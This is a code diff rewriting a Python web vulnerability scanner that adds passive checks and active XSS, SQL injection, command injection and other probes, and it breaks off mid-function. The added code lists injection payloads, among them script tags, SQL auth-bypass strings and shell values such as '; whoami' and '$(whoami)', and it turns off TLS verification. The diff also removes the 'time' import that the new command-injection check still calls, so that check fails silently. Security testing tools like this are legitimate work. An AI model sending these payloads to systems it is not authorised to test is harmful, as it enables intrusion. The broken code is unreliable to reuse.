@@ -1,1490 +1,1073 @@
-"""
-Enhanced Vulnerability Scanner for CyberSage v2.0
-Professional-grade vulnerability detection with detailed evidence collection
-"""
-
-from tools.crawler import WebCrawler
-from tools.fuzzer import ParameterFuzzer
-from tools.payload_generator import PayloadGenerator
-from tools.confidence_scorer import ConfidenceScorer
-from tools.enhanced_vuln_scanner import EnhancedVulnerabilityScanner
-from tools.vulnerability_detectors import AdditionalVulnerabilityDetectors
-from tools.security_header_scanner import SecurityHeaderScanner
+import subprocess
 import requests
-import re
-import time
-import urllib3
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-from bs4 import BeautifulSoup
-import hashlib
 import json
+import re
+import urllib3
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
 
+# Disable SSL warnings for testing
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
 
 class VulnerabilityScanner:
     """
-    Professional vulnerability scanner with detailed evidence collection
-    Enhanced with retry logic, timeout handling, and comprehensive error management
+    Enhanced comprehensive vulnerability scanning with real detection
     """
     
-    def __init__(self, database=None, broadcaster=None):
+    def __init__(self, database, broadcaster):
         self.db = database
         self.broadcaster = broadcaster
-        self.crawler = WebCrawler()
-        self.fuzzer = ParameterFuzzer()
-        self.payload_gen = PayloadGenerator()
-        self.confidence_scorer = ConfidenceScorer()
-        
-        # Initialize enhanced scanners
-        self.enhanced_scanner = EnhancedVulnerabilityScanner(broadcaster)
-        self.additional_detectors = AdditionalVulnerabilityDetectors()
-        self.security_scanner = SecurityHeaderScanner()
-        
-        self.vulnerabilities = []
-        self.scanned_urls = set()
         self.session = requests.Session()
+        self.session.verify = False
         self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 CyberSage/2.0'
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         })
-        
-        # Evidence collection
-        self.http_evidence = []
-        self.payloads_tested = 0
-        self.endpoints_tested = set()
-        
-        # Error tracking
-        self.errors_encountered = []
-        self.max_retries = 3
-        self.request_timeout = 10
-        self.max_consecutive_errors = 5
-        self.consecutive_errors = 0
-        
+    
     def comprehensive_scan(self, scan_id, recon_data):
-        """Execute comprehensive vulnerability scan with detailed tracking"""
+        """
+        Run comprehensive vulnerability scans with enhanced detection
+        """
         all_vulnerabilities = []
         target = recon_data['target']
+        live_hosts = recon_data.get('live_hosts', [])
         endpoints = recon_data.get('endpoints', [])
         
-        print(f"\n{'='*60}")
-        print(f"[Vuln Scanner] Starting comprehensive scan")
-        print(f"[Vuln Scanner] Target: {target}")
-        print(f"[Vuln Scanner] Endpoints: {len(endpoints)}")
-        print(f"{'='*60}\n")
+        # Passive Analysis prior to active probes
+        self.broadcaster.broadcast_tool_started(scan_id, 'Passive Analysis', target)
+        passive_vulns = self._passive_checks(scan_id, recon_data)
+        all_vulnerabilities.extend(passive_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Passive Analysis', 'success', len(passive_vulns))
+
+        # XSS Scanning - ENHANCED
+        self.broadcaster.broadcast_tool_started(scan_id, 'XSS Scanner', target)
+        xss_vulns = self._scan_xss_advanced(scan_id, target, endpoints)
+        all_vulnerabilities.extend(xss_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'XSS Scanner', 'success', len(xss_vulns))
         
-        try:
-            # Validate target
-            if not self._validate_target(target):
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Invalid target: {target}", 'error')
-                return all_vulnerabilities
+        # SQL Injection - ENHANCED
+        self.broadcaster.broadcast_tool_started(scan_id, 'SQL Injection Scanner', target)
+        sqli_vulns = self._scan_sqli_advanced(scan_id, target, endpoints)
+        all_vulnerabilities.extend(sqli_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'SQL Injection Scanner', 'success', len(sqli_vulns))
         
-            # Phase 1: Deep endpoint and form discovery
-            self.broadcaster.broadcast_tool_started(scan_id, 'Endpoint Discovery', target)
-            try:
-                discovered_endpoints = self._deep_endpoint_discovery(scan_id, target, endpoints)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Endpoint Discovery', 'success', len(discovered_endpoints))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Endpoint discovery failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'Endpoint Discovery', str(e))
-                discovered_endpoints = []
+        # Command Injection - NEW
+        self.broadcaster.broadcast_tool_started(scan_id, 'Command Injection Scanner', target)
+        cmd_vulns = self._scan_command_injection(scan_id, target, endpoints)
+        all_vulnerabilities.extend(cmd_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Command Injection Scanner', 'success', len(cmd_vulns))
         
-            print(f"[Vuln Scanner] Discovered {len(discovered_endpoints)} testable endpoints")
-            
-            # Phase 2: XSS Detection (Enhanced Multi-Context)
-            self.broadcaster.broadcast_tool_started(scan_id, 'XSS Scanner (Multi-Context)', target)
-            try:
-                xss_vulns = self._enhanced_xss_scan(scan_id, target, discovered_endpoints)
-                all_vulnerabilities.extend(xss_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'XSS Scanner', 'success', len(xss_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] XSS scan failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'XSS Scanner', str(e))
+        # LFI/RFI - NEW
+        self.broadcaster.broadcast_tool_started(scan_id, 'File Inclusion Scanner', target)
+        fi_vulns = self._scan_file_inclusion(scan_id, target, endpoints)
+        all_vulnerabilities.extend(fi_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'File Inclusion Scanner', 'success', len(fi_vulns))
         
-            # Phase 3: SQL Injection (Enhanced Detection)
-            self.broadcaster.broadcast_tool_started(scan_id, 'SQL Injection Scanner', target)
-            try:
-                sqli_vulns = self._enhanced_sqli_scan(scan_id, target, discovered_endpoints)
-                all_vulnerabilities.extend(sqli_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'SQL Injection Scanner', 'success', len(sqli_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] SQLi scan failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'SQLi Scanner', str(e))
-            
-            # Phase 4: Command Injection
-            self.broadcaster.broadcast_tool_started(scan_id, 'Command Injection Scanner', target)
-            try:
-                cmd_vulns = self._scan_command_injection(scan_id, target, discovered_endpoints)
-                all_vulnerabilities.extend(cmd_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Command Injection Scanner', 'success', len(cmd_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Command injection scan failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'Command Injection', str(e))
-            
-            # Phase 5: File Inclusion (LFI/RFI)
-            self.broadcaster.broadcast_tool_started(scan_id, 'File Inclusion Scanner', target)
-            try:
-                fi_vulns = self._scan_file_inclusion(scan_id, target, discovered_endpoints)
-                all_vulnerabilities.extend(fi_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'File Inclusion Scanner', 'success', len(fi_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] File inclusion scan failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'File Inclusion', str(e))
-            
-            # Phase 6: Directory Traversal
-            self.broadcaster.broadcast_tool_started(scan_id, 'Directory Traversal Scanner', target)
-            try:
-                traversal_vulns = self._scan_directory_traversal(scan_id, target, discovered_endpoints)
-                all_vulnerabilities.extend(traversal_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Directory Traversal Scanner', 'success', len(traversal_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Directory traversal scan failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'Directory Traversal', str(e))
-            
-            # Phase 7: Security Headers
-            self.broadcaster.broadcast_tool_started(scan_id, 'Security Headers Check', target)
-            try:
-                header_vulns = self._check_security_headers(scan_id, target)
-                all_vulnerabilities.extend(header_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Security Headers Check', 'success', len(header_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Security headers check failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'Security Headers', str(e))
-            
-            # Phase 8: Sensitive Files
-            self.broadcaster.broadcast_tool_started(scan_id, 'Sensitive File Scanner', target)
-            try:
-                file_vulns = self._scan_sensitive_files(scan_id, target)
-                all_vulnerabilities.extend(file_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Sensitive File Scanner', 'success', len(file_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Sensitive file scan failed: {str(e)}", 'error')
-            
-            # Phase 9: Enhanced Vulnerability Detection (100+ patterns)
-            self.broadcaster.broadcast_tool_started(scan_id, 'Enhanced Scanner (100+ Patterns)', target)
-            try:
-                # Run enhanced scanner on all discovered endpoints
-                for endpoint in discovered_endpoints[:50]:  # Limit to 50 endpoints for performance
-                    enhanced_vulns = self.enhanced_scanner.scan_url(endpoint['url'])
-                    all_vulnerabilities.extend(enhanced_vulns)
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Enhanced Scanner', 'success', len(enhanced_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Enhanced scan failed: {str(e)}", 'error')
-            
-            # Phase 10: Additional Vulnerability Detectors
-            self.broadcaster.broadcast_tool_started(scan_id, 'Advanced Detectors (XXE, SSRF, LDAP, etc)', target)
-            try:
-                for endpoint in discovered_endpoints[:30]:  # Test subset of endpoints
-                    parsed = urlparse(endpoint['url'])
-                    params = parse_qs(parsed.query)
-                    
-                    for param_name, param_values in params.items():
-                        param_value = param_values[0] if param_values else ''
-                        
-                        # Path Traversal
-                        path_vulns = self.additional_detectors.detect_path_traversal(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(path_vulns)
-                        
-                        # SSRF
-                        ssrf_vulns = self.additional_detectors.detect_ssrf(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(ssrf_vulns)
-                        
-                        # LDAP Injection
-                        ldap_vulns = self.additional_detectors.detect_ldap_injection(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(ldap_vulns)
-                        
-                        # XPath Injection
-                        xpath_vulns = self.additional_detectors.detect_xpath_injection(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(xpath_vulns)
-                        
-                        # NoSQL Injection
-                        nosql_vulns = self.additional_detectors.detect_nosql_injection(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(nosql_vulns)
-                        
-                        # Template Injection
-                        template_vulns = self.additional_detectors.detect_template_injection(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(template_vulns)
-                        
-                        # CRLF Injection
-                        crlf_vulns = self.additional_detectors.detect_crlf_injection(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(crlf_vulns)
-                        
-                        # Open Redirect
-                        redirect_vulns = self.additional_detectors.detect_open_redirect(endpoint['url'], param_name, param_value)
-                        all_vulnerabilities.extend(redirect_vulns)
-                
-                # XXE Injection (POST endpoints)
-                for endpoint in discovered_endpoints:
-                    if endpoint.get('method') == 'POST':
-                        xxe_vulns = self.additional_detectors.detect_xxe_injection(endpoint['url'])
-                        all_vulnerabilities.extend(xxe_vulns)
-                
-                # Host Header Injection
-                host_vulns = self.additional_detectors.detect_host_header_injection(target)
-                all_vulnerabilities.extend(host_vulns)
-                
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Advanced Detectors', 'success', len(all_vulnerabilities))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Advanced detectors failed: {str(e)}", 'error')
-            
-            # Phase 11: Security Configuration Checks
-            self.broadcaster.broadcast_tool_started(scan_id, 'Security Configuration Scanner', target)
-            try:
-                # Security Headers
-                header_vulns = self.security_scanner.detect_security_headers(target)
-                all_vulnerabilities.extend(header_vulns)
-                
-                # CORS Misconfiguration
-                cors_vulns = self.security_scanner.detect_cors_misconfiguration(target)
-                all_vulnerabilities.extend(cors_vulns)
-                
-                # Clickjacking
-                clickjack_vulns = self.security_scanner.detect_clickjacking(target)
-                all_vulnerabilities.extend(clickjack_vulns)
-                
-                # SSL/TLS Vulnerabilities
-                ssl_vulns = self.security_scanner.detect_weak_ssl(target)
-                all_vulnerabilities.extend(ssl_vulns)
-                
-                # Information Disclosure
-                info_vulns = self.security_scanner.detect_information_disclosure(target)
-                all_vulnerabilities.extend(info_vulns)
-                
-                # Subdomain Takeover
-                subdomain_vulns = self.security_scanner.detect_subdomain_takeover(target)
-                all_vulnerabilities.extend(subdomain_vulns)
-                
-                # API Key Detection
-                api_vulns = self.security_scanner.detect_api_keys(target)
-                all_vulnerabilities.extend(api_vulns)
-                
-                # JWT Vulnerabilities
-                jwt_vulns = self.security_scanner.detect_jwt_vulnerabilities(target)
-                all_vulnerabilities.extend(jwt_vulns)
-                
-                self.broadcaster.broadcast_tool_completed(scan_id, 'Security Configuration', 'success', len(header_vulns) + len(cors_vulns))
-            except Exception as e:
-                self.broadcaster.broadcast_log(scan_id, f"[ERROR] Security configuration scan failed: {str(e)}", 'error')
-                self._log_error(scan_id, 'Sensitive Files', str(e))
+        # Directory Traversal - ENHANCED
+        self.broadcaster.broadcast_tool_started(scan_id, 'Directory Traversal Scanner', target)
+        traversal_vulns = self._scan_directory_traversal_advanced(scan_id, target, endpoints)
+        all_vulnerabilities.extend(traversal_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Directory Traversal Scanner', 'success', len(traversal_vulns))
         
-            # Save all vulnerabilities and link HTTP evidence
-            for vuln in all_vulnerabilities:
-                try:
-                    vuln_id = self.db.add_vulnerability(scan_id, vuln)
-                    vuln['id'] = vuln_id
-                    
-                    # Link HTTP evidence to vulnerability
-                    raw_data = vuln.get('raw_data', {})
-                    if isinstance(raw_data, dict) and 'evidence_id' in raw_data:
-                        evidence_id = raw_data['evidence_id']
-                        try:
-                            self.db.link_http_evidence_to_vuln(evidence_id, vuln_id)
-                        except Exception as e:
-                            print(f"[WARNING] Failed to link HTTP evidence {evidence_id} to vuln {vuln_id}: {e}")
-                    
-                    self.broadcaster.broadcast_vulnerability_found(scan_id, vuln)
-                except Exception as e:
-                    print(f"[ERROR] Failed to save vulnerability: {str(e)}")
-                    self._log_error(scan_id, 'Vulnerability Save', str(e))
-            
-            # Update statistics
-            try:
-                self.db.update_scan_statistics(
-                    scan_id,
-                    endpoints_discovered=len(discovered_endpoints),
-                    payloads_sent=self.payloads_tested,
-                    vulnerabilities_found=len(all_vulnerabilities)
-                )
-            except Exception as e:
-                print(f"[WARNING] Failed to update statistics: {str(e)}")
-            
-            print(f"\n{'='*60}")
-            print(f"[Vuln Scanner] Scan complete!")
-            print(f"[Vuln Scanner] Vulnerabilities found: {len(all_vulnerabilities)}")
-            print(f"[Vuln Scanner] Payloads tested: {self.payloads_tested}")
-            if self.errors_encountered:
-                print(f"[Vuln Scanner] Errors encountered: {len(self.errors_encountered)}")
-            print(f"{'='*60}\n")
-            
-        except Exception as e:
-            print(f"[CRITICAL ERROR] Vulnerability scan failed: {str(e)}")
-            self.broadcaster.broadcast_log(scan_id, f"[CRITICAL] Scan failed: {str(e)}", 'error')
-            self._log_error(scan_id, 'Comprehensive Scan', str(e))
-            import traceback
-            traceback.print_exc()
+        # Open Redirect - NEW
+        self.broadcaster.broadcast_tool_started(scan_id, 'Open Redirect Scanner', target)
+        redirect_vulns = self._scan_open_redirect(scan_id, target, endpoints)
+        all_vulnerabilities.extend(redirect_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Open Redirect Scanner', 'success', len(redirect_vulns))
+        
+        # XXE - NEW
+        self.broadcaster.broadcast_tool_started(scan_id, 'XXE Scanner', target)
+        xxe_vulns = self._scan_xxe(scan_id, target, endpoints)
+        all_vulnerabilities.extend(xxe_vulns)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'XXE Scanner', 'success', len(xxe_vulns))
+        
+        # Security Headers
+        self.broadcaster.broadcast_tool_started(scan_id, 'Security Headers Check', target)
+        header_issues = self._check_security_headers(scan_id, live_hosts)
+        all_vulnerabilities.extend(header_issues)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Security Headers Check', 'success', len(header_issues))
+        
+        # CORS
+        self.broadcaster.broadcast_tool_started(scan_id, 'CORS Scanner', target)
+        cors_issues = self._scan_cors(scan_id, live_hosts)
+        all_vulnerabilities.extend(cors_issues)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'CORS Scanner', 'success', len(cors_issues))
+        
+        # Sensitive Files - ENHANCED
+        self.broadcaster.broadcast_tool_started(scan_id, 'Sensitive File Scanner', target)
+        file_exposures = self._scan_sensitive_files_advanced(scan_id, target)
+        all_vulnerabilities.extend(file_exposures)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Sensitive File Scanner', 'success', len(file_exposures))
+        
+        # Backup Files - NEW
+        self.broadcaster.broadcast_tool_started(scan_id, 'Backup File Scanner', target)
+        backup_files = self._scan_backup_files(scan_id, target)
+        all_vulnerabilities.extend(backup_files)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Backup File Scanner', 'success', len(backup_files))
+        
+        # Information Disclosure - NEW
+        self.broadcaster.broadcast_tool_started(scan_id, 'Information Disclosure Scanner', target)
+        info_disc = self._scan_information_disclosure(scan_id, target)
+        all_vulnerabilities.extend(info_disc)
+        self.broadcaster.broadcast_tool_completed(scan_id, 'Information Disclosure Scanner', 'success', len(info_disc))
+        
+        # Broadcast and store all found vulnerabilities
+        for vuln in all_vulnerabilities:
+            self.broadcaster.broadcast_vulnerability_found(scan_id, vuln)
+            self.db.add_vulnerability(scan_id, vuln)
         
         return all_vulnerabilities
-    
-    def _deep_endpoint_discovery(self, scan_id, target, initial_endpoints):
-        """
-        Deep endpoint discovery with form and parameter extraction
-        Returns list of testable endpoints with their parameters
-        """
-        discovered = []
-        visited = set()
-        
-        print(f"[Endpoint Discovery] Starting deep discovery...")
-        
-        # Discover from initial endpoints (INCREASED DEPTH)
-        for endpoint in initial_endpoints[:100]:  # Increased from 50 to 100
-            if endpoint in visited:
+
+    def _passive_checks(self, scan_id, recon_data):
+        """Passive header/cookie/dependency checks without malicious payloads"""
+        findings = []
+        live_hosts = recon_data.get('live_hosts', [])
+        for host in live_hosts[:10]:
+            url = host.get('url')
+            try:
+                resp = self.session.get(url, timeout=8)
+                # Cookie security
+                cookies = resp.cookies
+                for c in cookies:
+                    attrs = []
+                    if not getattr(c, 'secure', False):
+                        attrs.append('Secure')
+                    # httpOnly not exposed via requests cookies; infer via Set-Cookie header
+                    set_cookies = resp.headers.get('Set-Cookie', '')
+                    if c.name in set_cookies and 'httponly' not in set_cookies.lower():
+                        attrs.append('HttpOnly')
+                    if attrs:
+                        findings.append({
+                            'type': 'Cookie Security',
+                            'severity': 'medium',
+                            'title': f"Cookie '{c.name}' missing attributes: {', '.join(attrs)}",
+                            'description': 'Cookies should set Secure and HttpOnly flags to reduce risk.',
+                            'url': url,
+                            'confidence': 80,
+                            'tool': 'passive_analyzer',
+                            'poc': f"Set-Cookie: {c.name}=...; {resp.headers.get('Set-Cookie','')[:120]}",
+                            'remediation': 'Add Secure and HttpOnly to session cookies',
+                            'raw_data': {}
+                        })
+
+                # Cache-Control on sensitive pages
+                cache_control = resp.headers.get('Cache-Control', '')
+                page_lower = resp.text.lower()
+                sensitive_markers = any(x in page_lower for x in ['login', 'password', 'account', 'profile'])
+                if sensitive_markers and ('no-store' not in cache_control.lower() and 'private' not in cache_control.lower()):
+                    findings.append({
+                        'type': 'Caching Misconfiguration',
+                        'severity': 'medium',
+                        'title': 'Sensitive page missing no-store/private Cache-Control',
+                        'description': 'Sensitive pages should disable caching to prevent data exposure.',
+                        'url': url,
+                        'confidence': 60,
+                        'tool': 'passive_analyzer',
+                        'poc': f"Cache-Control: {cache_control}",
+                        'remediation': 'Add Cache-Control: no-store, private on sensitive pages',
+                        'raw_data': {'cache_control': cache_control}
+                    })
+
+                # Autocomplete on sensitive inputs
+                import re
+                forms = re.findall(r'<form[\s\S]*?>[\s\S]*?</form>', resp.text, re.IGNORECASE)
+                for form_html in forms[:20]:
+                    # Look for password inputs
+                    if re.search(r'<input[^>]*type=["\']password["\']', form_html, re.IGNORECASE):
+                        if 'autocomplete="off"' not in form_html.lower():
+                            findings.append({
+                                'type': 'Autocomplete Risk',
+                                'severity': 'low',
+                                'title': 'Password form missing autocomplete="off"',
+                                'description': 'Disable autocomplete on sensitive credential forms.',
+                                'url': url,
+                                'confidence': 70,
+                                'tool': 'passive_analyzer',
+                                'poc': form_html[:200],
+                                'remediation': 'Add autocomplete="off" to form or password inputs',
+                                'raw_data': {}
+                            })
+
+                # JS dependency versions in HTML
+                import re
+                scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
+                for src in scripts[:50]:
+                    lower = src.lower()
+                    version = None
+                    lib = None
+                    m = re.search(r'jquery[-.](\d+\.\d+\.\d+)', lower)
+                    if m:
+                        lib = 'jQuery'
+                        version = m.group(1)
+                    m = m or re.search(r'angular[-.](\d+\.\d+\.\d+)', lower)
+                    if not lib and m:
+                        lib = 'AngularJS'
+                        version = m.group(1)
+                    m2 = re.search(r'bootstrap[-.](\d+\.\d+\.\d+)', lower)
+                    if not lib and m2:
+                        lib = 'Bootstrap'
+                        version = m2.group(1)
+                    if lib and version:
+                        findings.append({
+                            'type': 'Dependency Risk',
+                            'severity': 'medium',
+                            'title': f"{lib} {version} detected",
+                            'description': f"Detected {lib} version {version} which may have known CVEs depending on release date.",
+                            'url': url,
+                            'confidence': 40,
+                            'tool': 'passive_analyzer',
+                            'poc': src,
+                            'remediation': f"Review {lib} changelog and update to latest stable.",
+                            'raw_data': {'library': lib, 'version': version, 'src': src}
+                        })
+            except Exception:
                 continue
-            visited.add(endpoint)
+        return findings
+    
+    def _scan_xss_advanced(self, scan_id, target, endpoints):
+        """Enhanced XSS scanning with multiple payloads and contexts"""
+        vulnerabilities = []
+        
+        xss_payloads = [
+            '<script>alert(1)</script>',
+            '<img src=x onerror=alert(1)>',
+            '"><script>alert(1)</script>',
+            '<svg/onload=alert(1)>',
+            '<iframe src=javascript:alert(1)>',
+            '<body onload=alert(1)>',
+            "'-alert(1)-'",
+            '<script>alert(String.fromCharCode(88,83,83))</script>',
+            '<img src="x" onerror="alert(1)">',
+            '"><img src=x onerror=alert(1)//>'
+        ]
+        
+        # Crawl target to find all forms and parameters
+        test_endpoints = self._discover_parameters(target, endpoints)
+        
+        for endpoint_data in test_endpoints:
+            endpoint = endpoint_data['url']
+            params = endpoint_data.get('params', {})
+            
+            for param_name in params.keys():
+                for payload in xss_payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        if endpoint_data.get('method') == 'POST':
+                            response = self.session.post(endpoint, data=test_params, timeout=10)
+                            method_used = 'POST'
+                            req_body = urlencode(test_params)
+                            req_url = endpoint
+                        else:
+                            response = self.session.get(endpoint, params=test_params, timeout=10)
+                            method_used = 'GET'
+                            req_body = ''
+                            req_url = requests.Request('GET', endpoint, params=test_params).prepare().url
+                        
+                        # Check if payload is reflected without encoding
+                        if payload in response.text and response.status_code == 200:
+                            # Verify it's in executable context
+                            if self._verify_xss_executable(response.text, payload):
+                                vuln = {
+                                    'type': 'XSS',
+                                    'severity': 'high',
+                                    'title': f'Reflected XSS in parameter: {param_name}',
+                                    'description': f'Parameter "{param_name}" reflects unencoded user input, allowing JavaScript execution',
+                                    'url': endpoint,
+                                    'confidence': 95,
+                                    'tool': 'xss_scanner',
+                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nMethod: {endpoint_data.get("method", "GET")}',
+                                    'remediation': 'Implement proper output encoding/escaping for all user input',
+                                    'raw_data': {'parameter': param_name, 'payload': payload, 'method': endpoint_data.get('method')}
+                                }
+                                vulnerabilities.append(vuln)
+                                try:
+                                    # Log HTTP history
+                                    self.db.add_http_request(
+                                        scan_id,
+                                        method_used,
+                                        req_url,
+                                        "\n".join([f"{k}: {v}" for k, v in self.session.headers.items()]),
+                                        req_body,
+                                        response.status_code,
+                                        "\n".join([f"{k}: {v}" for k, v in response.headers.items()]),
+                                        response.text,
+                                        0,
+                                        None
+                                    )
+                                except Exception:
+                                    pass
+                                break  # Found, no need to test more payloads for this param
+                    except Exception as e:
+                        continue
+        
+        return vulnerabilities
+    
+    def _scan_sqli_advanced(self, scan_id, target, endpoints):
+        """Enhanced SQL injection detection with multiple techniques"""
+        vulnerabilities = []
+        
+        sqli_payloads = [
+            ("'", "Single quote"),
+            ("' OR '1'='1", "Boolean-based blind"),
+            ("' OR '1'='1' --", "Comment injection"),
+            ("' OR '1'='1' #", "Hash comment"),
+            ("1' OR '1'='1", "Numeric injection"),
+            ("admin'--", "Auth bypass"),
+            ("' UNION SELECT NULL--", "Union-based"),
+            ("' AND 1=2 UNION SELECT NULL--", "Union with false condition"),
+            ("1' AND '1'='1", "AND injection"),
+            ("1' AND '1'='2", "Blind SQLi test"),
+        ]
+        
+        error_patterns = [
+            r"SQL syntax.*?error",
+            r"mysql_fetch",
+            r"mysql_num_rows",
+            r"mysqli",
+            r"ORA-\d{5}",
+            r"PostgreSQL.*?ERROR",
+            r"SQLSTATE\[\w+\]",
+            r"Unclosed quotation mark",
+            r"quoted string not properly terminated",
+            r"Microsoft SQL Native Client error"
+        ]
+        
+        # Discover all parameters
+        test_endpoints = self._discover_parameters(target, endpoints)
+        
+        for endpoint_data in test_endpoints:
+            endpoint = endpoint_data['url']
+            params = endpoint_data.get('params', {})
+            
+            for param_name in params.keys():
+                # First, get baseline response
+                try:
+                    baseline = self.session.get(endpoint, params=params, timeout=10)
+                    baseline_length = len(baseline.text)
+                except:
+                    continue
+                
+                for payload, technique in sqli_payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        if endpoint_data.get('method') == 'POST':
+                            response = self.session.post(endpoint, data=test_params, timeout=10)
+                            method_used = 'POST'
+                            req_body = urlencode(test_params)
+                            req_url = endpoint
+                        else:
+                            response = self.session.get(endpoint, params=test_params, timeout=10)
+                            method_used = 'GET'
+                            req_body = ''
+                            req_url = requests.Request('GET', endpoint, params=test_params).prepare().url
+                        
+                        # Check for SQL errors
+                        for pattern in error_patterns:
+                            if re.search(pattern, response.text, re.IGNORECASE):
+                                vuln = {
+                                    'type': 'SQL Injection',
+                                    'severity': 'critical',
+                                    'title': f'SQL Injection in parameter: {param_name}',
+                                    'description': f'SQL error detected when injecting {technique} payload in "{param_name}"',
+                                    'url': endpoint,
+                                    'confidence': 95,
+                                    'tool': 'sqli_scanner',
+                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nTechnique: {technique}\nError: {pattern}',
+                                    'remediation': 'Use parameterized queries/prepared statements',
+                                    'raw_data': {'parameter': param_name, 'payload': payload, 'technique': technique}
+                                }
+                                vulnerabilities.append(vuln)
+                                try:
+                                    self.db.add_http_request(
+                                        scan_id,
+                                        method_used,
+                                        req_url,
+                                        "\n".join([f"{k}: {v}" for k, v in self.session.headers.items()]),
+                                        req_body,
+                                        response.status_code,
+                                        "\n".join([f"{k}: {v}" for k, v in response.headers.items()]),
+                                        response.text,
+                                        0,
+                                        None
+                                    )
+                                except Exception:
+                                    pass
+                                break
+                        
+                        # Check for boolean-based blind SQLi
+                        if "'1'='1" in payload and response.status_code == 200:
+                            if abs(len(response.text) - baseline_length) > 100:  # Significant difference
+                                vuln = {
+                                    'type': 'SQL Injection',
+                                    'severity': 'critical',
+                                    'title': f'Blind SQL Injection in parameter: {param_name}',
+                                    'description': f'Boolean-based blind SQL injection detected in "{param_name}"',
+                                    'url': endpoint,
+                                    'confidence': 85,
+                                    'tool': 'sqli_scanner',
+                                    'poc': f'Parameter: {param_name}\nPayload: {payload}\nResponse length changed significantly',
+                                    'remediation': 'Use parameterized queries/prepared statements',
+                                    'raw_data': {'parameter': param_name, 'payload': payload}
+                                }
+                                vulnerabilities.append(vuln)
+                                try:
+                                    self.db.add_http_request(
+                                        scan_id,
+                                        method_used,
+                                        req_url,
+                                        "\n".join([f"{k}: {v}" for k, v in self.session.headers.items()]),
+                                        req_body,
+                                        response.status_code,
+                                        "\n".join([f"{k}: {v}" for k, v in response.headers.items()]),
+                                        response.text,
+                                        0,
+                                        None
+                                    )
+                                except Exception:
+                                    pass
+                    except:
+                        continue
+        
+        return vulnerabilities
+    
+    def _scan_command_injection(self, scan_id, target, endpoints):
+        """Scan for OS command injection"""
+        vulnerabilities = []
+        
+        cmd_payloads = [
+            ('; whoami', 'Semicolon separator'),
+            ('| whoami', 'Pipe operator'),
+            ('`whoami`', 'Backtick execution'),
+            ('$(whoami)', 'Command substitution'),
+            ('& whoami &', 'Background execution'),
+            ('; sleep 5', 'Time-based detection'),
+        ]
+        
+        indicators = ['uid=', 'root', 'www-data', 'apache', 'nginx']
+        
+        test_endpoints = self._discover_parameters(target, endpoints)
+        
+        for endpoint_data in test_endpoints:
+            endpoint = endpoint_data['url']
+            params = endpoint_data.get('params', {})
+            
+            for param_name in params.keys():
+                for payload, technique in cmd_payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param_name] = payload
+                        
+                        start_time = time.time()
+                        response = self.session.get(endpoint, params=test_params, timeout=15)
+                        elapsed = time.time() - start_time
+                        
+                        # Check for command output
+                        if any(indicator in response.text for indicator in indicators):
+                            vulnerabilities.append({
+                                'type': 'Command Injection',
+                                'severity': 'critical',
